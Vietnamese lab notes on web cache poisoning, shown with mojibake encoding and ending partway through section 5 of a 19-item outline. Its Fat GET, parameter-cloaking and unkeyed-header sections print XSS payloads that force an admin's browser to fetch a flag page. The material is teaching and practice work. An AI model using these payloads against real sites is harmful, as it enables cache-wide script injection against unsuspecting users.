
# Má»¤C Lá»¤C

DÆ°á»›i Ä‘Ã¢y lÃ  phiÃªn báº£n Ä‘Ã£ chá»‰nh sá»­a vá»›i dáº¥u tiáº¿ng Viá»‡t Ä‘áº§y Ä‘á»§ vÃ  thá»© tá»± rÃµ rÃ ng cho tá»«ng má»¥c. Báº¡n chá»‰ cáº§n nháº¥p vÃ o tiÃªu Ä‘á» lÃ  sáº½ Ä‘Æ°á»£c dáº«n Ä‘áº¿n ná»™i dung tÆ°Æ¡ng á»©ng.

---

### **LiÃªn Káº¿t Ná»™i Dung**

1. [**1. Ká»¹ Thuáº­t Tiáº¿n Tiáº¿n Trong Táº¥n CÃ´ng Web Cache Poisoning**](#1-ky-thuat-tien-tien-trong-tan-cong-web-cache-poisoning)  
2. [**2. Giá»›i Thiá»‡u Vá» Lá»—i Cáº¥u HÃ¬nh HTTP**](#2-gioi-thieu-ve-loi-cau-hinh-http)  
3. [**3. Giá»›i Thiá»‡u Vá» Táº¥n CÃ´ng Web Cache Poisoning**](#3-gioi-thieu-ve-tan-cong-web-cache-poisoning)  
4. [**4. XÃ¡c Äá»‹nh CÃ¡c Tham Sá»‘ KhÃ´ng ÄÆ°á»£c ÄÆ°a VÃ o Cache Key (Unkeyed Parameters)**](#4-xac-dinh-cac-tham-so-khong-duoc-dua-vao-cache-key-unkeyed-parameters)  
5. [**5. Táº¥n CÃ´ng Web Cache Poisoning**](#5-tan-cong-web-cache-poisoning)  
6. [**6. Ká»¹ Thuáº­t Web Cache Poisoning NÃ¢ng Cao**](#6-ky-thuat-web-cache-poisoning-nang-cao)  
7. [**7. CÃ´ng Cá»¥ vÃ  PhÃ²ng Ngá»«a Web Cache Poisoning**](#7-cong-cu-va-phong-ngua-web-cache-poisoning)  
8. [**8. Giá»›i Thiá»‡u vá» CÃ¡c Cuá»™c Táº¥n CÃ´ng Host Header**](#8-gioi-thieu-ve-cac-cuoc-tan-cong-host-header)  
9. [**9. Táº¥n CÃ´ng Bá» Qua XÃ¡c Thá»±c (Authentication Bypass) qua Host Header**](#9-tan-cong-bo-qua-xac-thuc-authentication-bypass-qua-host-header)  
10. [**10. Táº¥n CÃ´ng Password Reset Poisoning qua Host Header**](#10-tan-cong-password-reset-poisoning-qua-host-header)  
11. [**11. Táº¥n CÃ´ng Web Cache Poisoning qua Host Header**](#11-tan-cong-web-cache-poisoning-qua-host-header)  
12. [**12. Táº¥n CÃ´ng Bypass Kiá»ƒm Tra Host Header vÃ  CÃ¡c Lá»— Há»•ng Validation**](#12-tan-cong-bypass-kiem-tra-host-header-va-cac-lo-hong-validation)  
13. [**13. NgÄƒn Ngá»«a Táº¥n CÃ´ng Host Header**](#13-ngan-ngua-tan-cong-host-header)  
14. [**14. Giá»›i Thiá»‡u vá» Lá»— Há»•ng Session Puzzling**](#14-gioi-thieu-ve-lo-hong-session-puzzling)  
15. [**15. Lá»— Há»•ng Weak Session IDs**](#15-lo-hong-weak-session-ids)  
16. [**16. Common Session Variables vÃ  Lá»— Há»•ng Authentication Bypass**](#16-common-session-variables-va-lo-hong-authentication-bypass)  
17. [**17. Premature Session Population vÃ  Lá»— Há»•ng Authentication Bypass**](#17-premature-session-population-va-lo-hong-authentication-bypass)  
18. [**18. Common Session Variables vÃ  Lá»— Há»•ng Account Takeover**](#18-common-session-variables-va-lo-hong-account-takeover)  
19. [**19. NgÄƒn Cháº·n Session Puzzling Vulnerabilities**](#19-ngan-chan-session-puzzling-vulnerabilities)  

---

Vá»›i cÃ¡ch nÃ y, báº¡n cÃ³ thá»ƒ dá»… dÃ ng chuyá»ƒn Ä‘áº¿n pháº§n cáº§n xem. Náº¿u cáº§n thÃªm sá»± há»— trá»£ nÃ o khÃ¡c, cá»© thoáº£i mÃ¡i yÃªu cáº§u nhÃ©! ğŸ˜Š
---


# 1. Ká»¹ Thuáº­t Tiáº¿n Tiáº¿n Trong Táº¥n CÃ´ng Web Cache Poisoning

Trong pháº§n trÆ°á»›c, chÃºng ta Ä‘Ã£ tháº£o luáº­n vá» cÃ¡c ká»¹ thuáº­t cÆ¡ báº£n Ä‘á»ƒ phÃ¡t hiá»‡n vÃ  khai thÃ¡c lá»— há»•ng web cache poisoning. Trong pháº§n nÃ y, chÃºng ta sáº½ tÃ¬m hiá»ƒu hai ká»¹ thuáº­t tiÃªn tiáº¿n khai thÃ¡c cÃ¡c lá»—i cáº¥u hÃ¬nh cá»§a mÃ¡y chá»§ web, biáº¿n cÃ¡c cáº¥u hÃ¬nh tÆ°á»Ÿng chá»«ng an toÃ n trá»Ÿ nÃªn dá»… bá»‹ tá»•n thÆ°Æ¡ng.

---

### **1. Fat GET**

#### **KhÃ¡i niá»‡m**
- **Fat GET** lÃ  cÃ¡c yÃªu cáº§u HTTP GET cÃ³ chá»©a **request body** (pháº§n ná»™i dung trong yÃªu cáº§u).
- Theo tiÃªu chuáº©n, GET parameters Ä‘Æ°á»£c truyá»n qua query string (pháº§n sau dáº¥u `?` trong URL). Viá»‡c gá»­i thÃªm **request body** trong GET lÃ  khÃ´ng cáº§n thiáº¿t vÃ  khÃ´ng cÃ³ Ã½ nghÄ©a.
- Tuy nhiÃªn, má»™t sá»‘ mÃ¡y chá»§ bá»‹ cáº¥u hÃ¬nh sai cÃ³ thá»ƒ xá»­ lÃ½ cÃ¡c tham sá»‘ trong **request body**, dáº«n Ä‘áº¿n viá»‡c khai thÃ¡c lá»— há»•ng **web cache poisoning**.

#### **VÃ­ dá»¥ minh há»a**
- Xem xÃ©t á»©ng dá»¥ng web vá»›i URL sau:  
  ```http
  GET /index.php?language=en HTTP/1.1
  Host: fatget.wcp.htb
  ```
  **language** Ä‘Æ°á»£c Ä‘áº·t lÃ  `en` (tiáº¿ng Anh). Tuy nhiÃªn, náº¿u ta gá»­i yÃªu cáº§u nhÆ° sau:  
  ```http
  GET /index.php?language=en HTTP/1.1
  Host: fatget.wcp.htb
  Content-Length: 11
  language=de
  ```
  **language** trong **request body** lÃ  `de` (tiáº¿ng Äá»©c). Náº¿u mÃ¡y chá»§ Æ°u tiÃªn giÃ¡ trá»‹ trong **request body**, káº¿t quáº£ sáº½ tráº£ vá» trang báº±ng tiáº¿ng Äá»©c.

#### **Táº¥n cÃ´ng Fat GET**
1. XÃ¡c nháº­n lá»— há»•ng:  
   - Gá»­i yÃªu cáº§u vá»›i **request body** vÃ  kiá»ƒm tra xem mÃ¡y chá»§ xá»­ lÃ½ tham sá»‘ nÃ o.
2. Poison cache:
   - Sá»­ dá»¥ng **Fat GET** Ä‘á»ƒ gá»­i payload Ä‘á»™c háº¡i vÃ o cache:
     ```http
     GET /index.php?language=de HTTP/1.1
     Host: fatget.wcp.htb
     Content-Length: 142
     ref="><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();</script>
     ```
   - Khi admin truy cáº­p, payload XSS sáº½ Ä‘Æ°á»£c thá»±c thi vÃ  tiáº¿t lá»™ thÃ´ng tin nháº¡y cáº£m.

---

### **2. Parameter Cloaking**

#### **KhÃ¡i niá»‡m**
- Ká»¹ thuáº­t nÃ y khai thÃ¡c sá»± khÃ¡c biá»‡t trong cÃ¡ch mÃ¡y chá»§ vÃ  bá»™ nhá»› cache xá»­ lÃ½ cÃ¡c tham sá»‘ URL.
- Náº¿u bá»™ nhá»› cache vÃ  mÃ¡y chá»§ khÃ´ng Ä‘á»“ng bá»™ trong viá»‡c nháº­n diá»‡n tham sá»‘ URL, cÃ³ thá»ƒ táº¡o ra lá»— há»•ng.

#### **VÃ­ dá»¥ minh há»a**
- Vá»›i framework Python Bottle (CVE-2020-28473), tham sá»‘ URL cÃ³ thá»ƒ sá»­ dá»¥ng dáº¥u cháº¥m pháº©y `;` Ä‘á»ƒ phÃ¢n tÃ¡ch:  
  ```http
  GET /?a=1;b=2
  ```
  - Bottle tháº¥y:  
    - `a = 1`, `b = 2`
  - Bá»™ nhá»› cache tháº¥y:  
    - `a = 1;b=2`

#### **Táº¥n cÃ´ng Parameter Cloaking**
1. Táº¡o sá»± khÃ¡c biá»‡t giá»¯a mÃ¡y chá»§ vÃ  cache:
   ```http
   GET /?language=en&a=b;language=de HTTP/1.1
   Host: cloak.wcp.htb
   ```
   - MÃ¡y chá»§ xá»­ lÃ½ `language=de` (tiáº¿ng Äá»©c), trong khi bá»™ nhá»› cache lÆ°u `language=en`.

2. Poison cache:
   - Gá»­i payload Ä‘á»™c háº¡i vá»›i tham sá»‘ Ä‘Æ°á»£c che giáº¥u:
     ```http
     GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.open('GET','/admin?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();%3C/script%3E HTTP/1.1
     Host: cloak.wcp.htb
     ```
   - Khi admin truy cáº­p, script XSS sáº½ Ä‘Æ°á»£c thá»±c thi Ä‘á»ƒ lá»™ flag.

---

### **LÆ°u Ã½ quan trá»ng**
- **Fat GET** thÆ°á»ng do cáº¥u hÃ¬nh sai cá»§a mÃ¡y chá»§ web.
- **Parameter Cloaking** cáº§n cÃ³ sá»± khÃ¡c biá»‡t trong cÃ¡ch xá»­ lÃ½ tham sá»‘ giá»¯a cache vÃ  mÃ¡y chá»§.

---
DÆ°á»›i Ä‘Ã¢y lÃ  tÃ i liá»‡u Ä‘Ã£ Ä‘Æ°á»£c viáº¿t láº¡i vá»›i cÃ¡ch trÃ¬nh bÃ y rÃµ rÃ ng, dá»… hiá»ƒu hÆ¡n:

---

# 2. Giá»›i Thiá»‡u Vá» Lá»—i Cáº¥u HÃ¬nh HTTP

HTTP lÃ  má»™t trong nhá»¯ng giao thá»©c Ä‘Æ°á»£c sá»­ dá»¥ng phá»• biáº¿n nháº¥t trÃªn Internet, há»— trá»£ hÃ ng tá»· thiáº¿t bá»‹ má»—i ngÃ y. Vá»›i vai trÃ² quan trá»ng cá»§a cÃ¡c á»©ng dá»¥ng web trong tháº¿ giá»›i sá»‘, báº£o máº­t web khÃ´ng chá»‰ dá»«ng láº¡i á»Ÿ viá»‡c xem xÃ©t tá»«ng á»©ng dá»¥ng riÃªng láº», mÃ  cáº§n Ä‘Ã¡nh giÃ¡ tá»•ng thá»ƒ há»‡ thá»‘ng, bao gá»“m cáº£ cÃ¡c thÃ nh pháº§n nhÆ° mÃ¡y chá»§ web vÃ  bá»™ nhá»› Ä‘á»‡m (web caches), nhá»¯ng yáº¿u tá»‘ lÃ m tÄƒng Ä‘á»™ phá»©c táº¡p vÃ  bá» máº·t táº¥n cÃ´ng.
---

### **Web Cache vÃ  Lá»— Há»•ng Tiá»m áº¨n**
- **Web caches** Ä‘Æ°á»£c sá»­ dá»¥ng trong cÃ¡c dá»‹ch vá»¥ web Ä‘á»ƒ cáº£i thiá»‡n hiá»‡u suáº¥t báº±ng cÃ¡ch giáº£m táº£i cho mÃ¡y chá»§.  
- Khi má»™t tÃ i nguyÃªn Ä‘Æ°á»£c yÃªu cáº§u, bá»™ nhá»› Ä‘á»‡m lÆ°u trá»¯ tÃ i nguyÃªn Ä‘Ã³ Ä‘á»ƒ cÃ³ thá»ƒ phá»¥c vá»¥ cÃ¡c yÃªu cáº§u tÆ°Æ¡ng tá»± tá»« bá»™ nhá»› cá»¥c bá»™ mÃ  khÃ´ng cáº§n yÃªu cáº§u láº¡i tá»« mÃ¡y chá»§.  
- Tuy nhiÃªn, sá»± phá»¥ thuá»™c nÃ y cÅ©ng cÃ³ thá»ƒ dáº«n Ä‘áº¿n lá»— há»•ng báº£o máº­t náº¿u bá»™ nhá»› Ä‘á»‡m Ä‘Æ°á»£c cáº¥u hÃ¬nh sai, táº¡o cÆ¡ há»™i cho cÃ¡c kiá»ƒu táº¥n cÃ´ng nhÆ° **Web Cache Poisoning**.

---

### **Host Header vÃ  Vai TrÃ² Cá»§a NÃ³**
- **Host header** lÃ  má»™t pháº§n báº¯t buá»™c trong má»i yÃªu cáº§u HTTP tá»« phiÃªn báº£n HTTP/1.1, xÃ¡c Ä‘á»‹nh tÃªn miá»n hoáº·c cá»•ng cá»§a mÃ¡y chá»§ mÃ  yÃªu cáº§u Ä‘Æ°á»£c gá»­i Ä‘áº¿n.  
- Khi má»™t mÃ¡y chá»§ phá»¥c vá»¥ nhiá»u á»©ng dá»¥ng web, **host header** Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Ä‘á»‹nh danh á»©ng dá»¥ng má»¥c tiÃªu.  
- Náº¿u á»©ng dá»¥ng xá»­ lÃ½ **host header** khÃ´ng Ä‘Ãºng cÃ¡ch, cÃ³ thá»ƒ xuáº¥t hiá»‡n lá»— há»•ng cho phÃ©p káº» táº¥n cÃ´ng thá»±c hiá»‡n cÃ¡c **Host Header Attacks**.

---

### **Session VÃ  Táº§m Quan Trá»ng Cá»§a NÃ³**
- HTTP lÃ  giao thá»©c **stateless** (khÃ´ng lÆ°u tráº¡ng thÃ¡i), vÃ¬ váº­y **sessions** Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ cung cáº¥p ngá»¯ cáº£nh cho cÃ¡c yÃªu cáº§u.  
- ThÃ´ng qua session ID, á»©ng dá»¥ng web cÃ³ thá»ƒ nháº­n diá»‡n ngÆ°á»i dÃ¹ng mÃ  khÃ´ng cáº§n xÃ¡c thá»±c trong má»—i yÃªu cáº§u.  
- Náº¿u session variables (biáº¿n phiÃªn) Ä‘Æ°á»£c xá»­ lÃ½ khÃ´ng Ä‘Ãºng cÃ¡ch, cÃ³ thá»ƒ dáº«n Ä‘áº¿n cÃ¡c lá»— há»•ng nhÆ° **Session Puzzling**, gÃ¢y nguy cÆ¡ chiáº¿m quyá»n tÃ i khoáº£n hoáº·c vÆ°á»£t qua cÆ¡ cháº¿ xÃ¡c thá»±c.

---

### **CÃ¡c Kiá»ƒu Táº¥n CÃ´ng HTTP**

#### **1. Web Cache Poisoning**
- **Má»¥c tiÃªu:** Khai thÃ¡c lá»—i cáº¥u hÃ¬nh trong bá»™ nhá»› Ä‘á»‡m vÃ  cÃ¡c lá»— há»•ng cá»§a á»©ng dá»¥ng web cÆ¡ sá»Ÿ Ä‘á»ƒ táº¥n cÃ´ng ngÆ°á»i dÃ¹ng khÃ´ng cáº£nh giÃ¡c.  
- **Nguy hiá»ƒm:**  
  - Tá»± Ä‘á»™ng khai thÃ¡c chá»‰ báº±ng cÃ¡ch ngÆ°á»i dÃ¹ng truy cáº­p trang web má»¥c tiÃªu.  
  - Biáº¿n cÃ¡c lá»— há»•ng khÃ³ khai thÃ¡c thÃ nh vÅ© khÃ­ hiá»‡u quáº£ Ä‘á»ƒ táº¥n cÃ´ng hÃ ng loáº¡t náº¡n nhÃ¢n.  

---

#### **2. Host Header Attacks**
- **Má»¥c tiÃªu:** Táº­n dá»¥ng lá»—i trong viá»‡c xá»­ lÃ½ **host header** Ä‘á»ƒ:  
  - Bypass (vÆ°á»£t qua) kiá»ƒm tra á»§y quyá»n.  
  - Táº¡o liÃªn káº¿t Ä‘á»™c háº¡i thÃ´ng qua viá»‡c thao tÃºng **host header**.  
- **CÃ¡ch thá»©c:**  
  - Lá»£i dá»¥ng cÃ¡c á»©ng dá»¥ng sá»­ dá»¥ng **host header** Ä‘á»ƒ táº¡o liÃªn káº¿t tuyá»‡t Ä‘á»‘i hoáº·c thá»±c hiá»‡n kiá»ƒm tra báº£o máº­t.  

---

#### **3. Session Puzzling**
- **Má»¥c tiÃªu:** Khai thÃ¡c lá»—i trong viá»‡c xá»­ lÃ½ session variables Ä‘á»ƒ:  
  - VÆ°á»£t qua xÃ¡c thá»±c.  
  - Chiáº¿m quyá»n Ä‘iá»u khiá»ƒn tÃ i khoáº£n.  
- **NguyÃªn nhÃ¢n:**  
  - TÃ¡i sá»­ dá»¥ng session variables trong cÃ¡c quy trÃ¬nh khÃ¡c nhau.  
  - GÃ¡n giÃ¡ trá»‹ máº·c Ä‘á»‹nh khÃ´ng an toÃ n cho session variables.  
  - Quáº£n lÃ½ session variables khÃ´ng Ä‘Ãºng cÃ¡ch.

---

# 3. Giá»›i Thiá»‡u Vá» Táº¥n CÃ´ng Web Cache Poisoning

**Web cache poisoning** lÃ  má»™t phÆ°Æ¡ng thá»©c táº¥n cÃ´ng tiÃªn tiáº¿n nháº±m Ã©p bá»™ nhá»› Ä‘á»‡m web cung cáº¥p ná»™i dung Ä‘á»™c háº¡i cho ngÆ°á»i dÃ¹ng khÃ´ng ngá» Ä‘áº¿n khi truy cáº­p vÃ o trang web bá»‹ tá»•n thÆ°Æ¡ng.  
- **Má»¥c Ä‘Ã­ch:** Lá»£i dá»¥ng bá»™ nhá»› Ä‘á»‡m Ä‘á»ƒ phÃ¢n phá»‘i mÃ£ Ä‘á»™c hoáº·c gia tÄƒng má»©c Ä‘á»™ nghiÃªm trá»ng cá»§a lá»— há»•ng, cháº³ng háº¡n nhÆ° chuyá»ƒn Ä‘á»•i **reflected XSS** thÃ nh má»™t cuá»™c táº¥n cÃ´ng diá»‡n rá»™ng mÃ  khÃ´ng cáº§n sá»± tÆ°Æ¡ng tÃ¡c cá»§a ngÆ°á»i dÃ¹ng.  
- **VÃ­ dá»¥:** Táº¥n cÃ´ng cÃ³ thá»ƒ xáº£y ra trÃªn cÃ¡c bá»™ nhá»› Ä‘á»‡m phá»• biáº¿n nhÆ° **Apache**, **Nginx**, vÃ  **Squid**.  

---

### **NguyÃªn LÃ½ Hoáº¡t Äá»™ng Cá»§a Bá»™ Nhá»› Äá»‡m Web**

#### **Lá»£i Ãch Cá»§a Caching**
- Khi má»™t dá»‹ch vá»¥ web cÃ³ lÆ°á»£ng ngÆ°á»i dÃ¹ng lá»›n, kháº£ nÄƒng má»Ÿ rá»™ng lÃ  ráº¥t quan trá»ng.  
- **Web caches** giÃºp giáº£m táº£i cho mÃ¡y chá»§ báº±ng cÃ¡ch lÆ°u trá»¯ cÃ¡c tÃ i nguyÃªn cá»¥c bá»™ Ä‘á»ƒ phá»¥c vá»¥ cÃ¡c yÃªu cáº§u tÆ°Æ¡ng tá»± trong tÆ°Æ¡ng lai mÃ  khÃ´ng cáº§n truy váº¥n mÃ¡y chá»§ gá»‘c.  
- **CÃ¡ch hoáº¡t Ä‘á»™ng:**  
  - Náº¿u tÃ i nguyÃªn chÆ°a Ä‘Æ°á»£c lÆ°u, bá»™ nhá»› Ä‘á»‡m sáº½ yÃªu cáº§u mÃ¡y chá»§ vÃ  sau Ä‘Ã³ lÆ°u láº¡i Ä‘á»ƒ sá»­ dá»¥ng cho cÃ¡c yÃªu cáº§u tiáº¿p theo.  
  - TÃ i nguyÃªn Ä‘Æ°á»£c lÆ°u trong má»™t khoáº£ng thá»i gian giá»›i háº¡n Ä‘á»ƒ Ä‘áº£m báº£o cÃ¡c thay Ä‘á»•i trÃªn mÃ¡y chá»§ Ä‘Æ°á»£c cáº­p nháº­t.

---

#### **CÃ¡ch Bá»™ Nhá»› Äá»‡m PhÃ¢n Biá»‡t YÃªu Cáº§u**
Bá»™ nhá»› Ä‘á»‡m sá»­ dá»¥ng má»™t táº­p há»£p con cá»§a cÃ¡c thÃ´ng sá»‘ yÃªu cáº§u HTTP Ä‘á»ƒ xÃ¡c Ä‘á»‹nh liá»‡u hai yÃªu cáº§u cÃ³ thá»ƒ Ä‘Æ°á»£c phá»¥c vá»¥ cÃ¹ng má»™t pháº£n há»“i hay khÃ´ng. Táº­p há»£p nÃ y gá»i lÃ  **Cache Key**.  
- **Cáº¥u hÃ¬nh máº·c Ä‘á»‹nh:**  
  - Bao gá»“m: **ÄÆ°á»ng dáº«n yÃªu cáº§u (request path)**, **tham sá»‘ GET**, vÃ  **Host header**.  
  - KhÃ´ng bao gá»“m: CÃ¡c thÃ´ng sá»‘ khÃ´ng áº£nh hÆ°á»Ÿng trá»±c tiáº¿p Ä‘áº¿n pháº£n há»“i nhÆ° **User-Agent** hoáº·c **Referer**.

---

### **VÃ­ Dá»¥ Vá» Cache Key**

**Cáº¥u hÃ¬nh máº·c Ä‘á»‹nh:**
1. YÃªu cáº§u Ä‘áº§u tiÃªn:  
   ```plaintext
   GET /index.html?language=en HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
   ```
2. YÃªu cáº§u thá»© hai (khÃ¡c **User-Agent**, nhÆ°ng Cache Key khÃ´ng thay Ä‘á»•i):  
   ```plaintext
   GET /index.html?language=en HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1)
   ```
   â†’ **Káº¿t quáº£:** Cáº£ hai yÃªu cáº§u Ä‘Æ°á»£c phá»¥c vá»¥ cÃ¹ng má»™t pháº£n há»“i.  

**Thay Ä‘á»•i Cache Key (thay Ä‘á»•i tham sá»‘ GET):**
- YÃªu cáº§u vá»›i tham sá»‘ ngÃ´n ngá»¯ khÃ¡c:  
   ```plaintext
   GET /index.html?language=de HTTP/1.1
   Host: example.com
   ```
   â†’ **Káº¿t quáº£:** Pháº£n há»“i khÃ¡c do Cache Key thay Ä‘á»•i.

**PhÃ¢n loáº¡i tham sá»‘:**
- **Keyed parameters:** Tham sá»‘ náº±m trong Cache Key (vÃ­ dá»¥: **GET parameters**, **Host header**).  
- **Unkeyed parameters:** Tham sá»‘ khÃ´ng náº±m trong Cache Key (vÃ­ dá»¥: **User-Agent**, **Referer**).  

---

### **Cáº¥u HÃ¬nh Bá»™ Nhá»› Äá»‡m Web Trong Nginx**

**Cáº¥u hÃ¬nh máº«u Nginx:**
```nginx
http {
    proxy_cache_path /cache levels=1:2 keys_zone=STATIC:10m inactive=24h max_size=1g;
    server {
        listen 80;
        location / {
            proxy_pass http://172.17.0.1:80;
            proxy_buffering on;
            proxy_cache STATIC;
            proxy_cache_valid 2m;
            proxy_cache_key $scheme$proxy_host$uri$args;
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
}
```

**Giáº£i thÃ­ch:**
1. `proxy_cache_path`: Thiáº¿t láº­p Ä‘Æ°á»ng dáº«n lÆ°u trá»¯ bá»™ nhá»› Ä‘á»‡m.  
2. `proxy_pass`: Äá»‹a chá»‰ mÃ¡y chá»§ gá»‘c.  
3. `proxy_buffering`: KÃ­ch hoáº¡t caching.  
4. `proxy_cache_valid`: Thá»i gian tá»“n táº¡i cá»§a bá»™ nhá»› Ä‘á»‡m (vÃ­ dá»¥: 2 phÃºt).  
5. `proxy_cache_key`: Äá»‹nh nghÄ©a Cache Key (vÃ­ dá»¥: `$uri$args`).  
6. `add_header`: ThÃªm thÃ´ng tin tráº¡ng thÃ¡i cache (`X-Cache-Status`) vÃ o pháº£n há»“i.

---

### **Cáº¥u HÃ¬nh TÃ¹y Chá»‰nh Cache Key**

VÃ­ dá»¥: Chá»‰ thÃªm tham sá»‘ **language** vÃ o Cache Key:  
```nginx
proxy_cache_key $scheme$proxy_host$uri$arg_language;
```

**Káº¿t quáº£:**  
- Hai yÃªu cáº§u sau sáº½ Ä‘Æ°á»£c phá»¥c vá»¥ cÃ¹ng má»™t pháº£n há»“i:  
  ```plaintext
  GET /index.html?language=de&timestamp=1
  GET /index.html?language=de&timestamp=2
  ```
- **LÃ½ do:** Tham sá»‘ **timestamp** khÃ´ng náº±m trong Cache Key.

---
# 4. XÃ¡c Äá»‹nh CÃ¡c Tham Sá»‘ KhÃ´ng ÄÆ°á»£c ÄÆ°a VÃ o Cache Key (Unkeyed Parameters)

Trong táº¥n cÃ´ng **web cache poisoning**, má»¥c tiÃªu lÃ  buá»™c bá»™ nhá»› Ä‘á»‡m phá»¥c vá»¥ ná»™i dung Ä‘á»™c háº¡i cho nhá»¯ng ngÆ°á»i dÃ¹ng khÃ¡c. Äiá»u nÃ y yÃªu cáº§u sá»­ dá»¥ng **unkeyed parameters** Ä‘á»ƒ chÃ¨n payload Ä‘á»™c háº¡i vÃ o pháº£n há»“i Ä‘Æ°á»£c lÆ°u trá»¯.  
- Náº¿u tham sá»‘ lÃ  **keyed**, yÃªu cáº§u cá»§a náº¡n nhÃ¢n pháº£i chá»©a chÃ­nh payload Ä‘á»™c háº¡i Ä‘Ã³, giá»‘ng nhÆ° trong táº¥n cÃ´ng **reflected XSS**, háº¡n cháº¿ kháº£ nÄƒng táº¥n cÃ´ng hÃ ng loáº¡t.  

---

### **VÃ­ Dá»¥: PhÃ¢n TÃ­ch Unkeyed Parameters**

Giáº£ sá»­ má»™t á»©ng dá»¥ng web dá»… bá»‹ táº¥n cÃ´ng XSS qua tham sá»‘ `ref` vÃ  há»— trá»£ nhiá»u ngÃ´n ngá»¯ qua tham sá»‘ `language`.  
- **`language` lÃ  keyed**, trong khi **`ref` lÃ  unkeyed.**  
- URL Ä‘á»™c háº¡i:  
  ```plaintext
  /index.php?language=en&ref="><script>alert(1)</script>
  ```
- Bá»™ nhá»› Ä‘á»‡m lÆ°u láº¡i pháº£n há»“i chá»©a mÃ£ Ä‘á»™c vÃ  phá»¥c vá»¥ cho táº¥t cáº£ yÃªu cáº§u `/index.php?language=en`.  

---

### **XÃ¡c Äá»‹nh Unkeyed Parameters**

1. **NguyÃªn táº¯c chung:**  
   - Quan sÃ¡t sá»± thay Ä‘á»•i trong pháº£n há»“i khi thay Ä‘á»•i tham sá»‘.  
   - Náº¿u thay Ä‘á»•i giÃ¡ trá»‹ tham sá»‘ nhÆ°ng pháº£n há»“i váº«n giá»‘ng nhau â†’ tham sá»‘ Ä‘Ã³ lÃ  **unkeyed.**  

2. **VÃ­ dá»¥: Thá»­ nghiá»‡m vá»›i cÃ¡c tham sá»‘ GET**
   - **Tham sá»‘ `language` (keyed):**  
     - YÃªu cáº§u Ä‘áº§u tiÃªn: Cache miss.  
     - YÃªu cáº§u thá»© hai (cÃ¹ng giÃ¡ trá»‹): Cache hit.  
     - Thay Ä‘á»•i giÃ¡ trá»‹ â†’ Cache miss.  

   - **Tham sá»‘ `content` (keyed):**  
     - TÆ°Æ¡ng tá»± nhÆ° `language`, cÃ¡c giÃ¡ trá»‹ khÃ¡c nhau dáº«n Ä‘áº¿n cache miss.  

   - **Tham sá»‘ `ref` (unkeyed):**  
     - YÃªu cáº§u Ä‘áº§u tiÃªn: Cache miss.  
     - YÃªu cáº§u vá»›i giÃ¡ trá»‹ khÃ¡c cá»§a `ref`: Cache hit.  

---

### **Thá»±c Hiá»‡n Táº¥n CÃ´ng**

1. **XÃ¡c Ä‘á»‹nh XSS qua tham sá»‘ unkeyed (`ref`):**  
   - URL Ä‘á»™c háº¡i:  
     ```plaintext
     /index.php?language=unusedvalue&ref="><script>alert(1)</script>
     ```
   - **LÆ°u Ã½:** DÃ¹ng giÃ¡ trá»‹ `language` chÆ°a tá»«ng sá»­ dá»¥ng trÆ°á»›c Ä‘Ã³ Ä‘á»ƒ trÃ¡nh pháº£n há»“i Ä‘Æ°á»£c láº¥y tá»« cache.  

2. **Ká»‹ch báº£n táº¥n cÃ´ng:**  
   - Poison cache vá»›i payload:  
     ```html
     <script>
       var xhr = new XMLHttpRequest();
       xhr.open('GET', '/admin.php?reveal_flag=1', true);
       xhr.withCredentials = true;
       xhr.send();
     </script>
     ```
   - URL Ä‘á»ƒ poison cache:  
     ```plaintext
     GET /index.php?language=de&ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E
     ```

3. **Káº¿t quáº£:**  
   - Khi admin truy cáº­p trang `/index.php?language=de`, payload Ä‘Æ°á»£c kÃ­ch hoáº¡t, vÃ  pháº£n há»“i `/admin.php?reveal_flag=1` Ä‘Æ°á»£c gá»­i Ä‘áº¿n káº» táº¥n cÃ´ng.

---

### **PhÃ¢n TÃ­ch Headers KhÃ´ng ÄÆ°á»£c ÄÆ°a VÃ o Cache Key**

TÆ°Æ¡ng tá»± vá»›i tham sá»‘ GET, má»™t sá»‘ HTTP headers cÅ©ng cÃ³ thá»ƒ lÃ  **unkeyed**:  
- **VÃ­ dá»¥:** Header `X-Backend-Server` (unkeyed).  
  - Header nÃ y áº£nh hÆ°á»Ÿng Ä‘áº¿n vá»‹ trÃ­ táº£i script debug.  

**Payload qua header:**
```plaintext
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb"></script><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

---
# 5. Táº¥n CÃ´ng Web Cache Poisoning

Táº¥n cÃ´ng **web cache poisoning** chá»§ yáº¿u nháº±m khai thÃ¡c lá»— há»•ng tiá»m áº©n trong á»©ng dá»¥ng web Ä‘á»ƒ phÃ¢n phá»‘i rá»™ng rÃ£i Ä‘áº¿n nhiá»u ngÆ°á»i dÃ¹ng. DÆ°á»›i Ä‘Ã¢y lÃ  tá»•ng quan vá» khai thÃ¡c, tÃ¡c Ä‘á»™ng vÃ  cÃ¡c ká»¹ thuáº­t thá»±c hiá»‡n.

---

### **CÃ¡ch Khai ThÃ¡c Web Cache Poisoning**

#### 1. **XÃ¡c Ä‘á»‹nh tham sá»‘ hoáº·c tiÃªu Ä‘á» khÃ´ng Ä‘Æ°á»£c Ä‘Æ°a vÃ o cache key (unkeyed):**
   - PhÃ¡t hiá»‡n cÃ¡c tham sá»‘ GET, cookies hoáº·c HTTP headers khÃ´ng Ä‘Æ°á»£c Ä‘Æ°a vÃ o cache key.
   - Gá»­i yÃªu cáº§u thá»­ nghiá»‡m Ä‘á»ƒ xem xÃ©t cÃ¡c thay Ä‘á»•i trong pháº£n há»“i.

#### 2. **Táº¥n cÃ´ng dá»±a trÃªn thá»i gian háº¿t háº¡n cá»§a bá»™ nhá»› Ä‘á»‡m:**
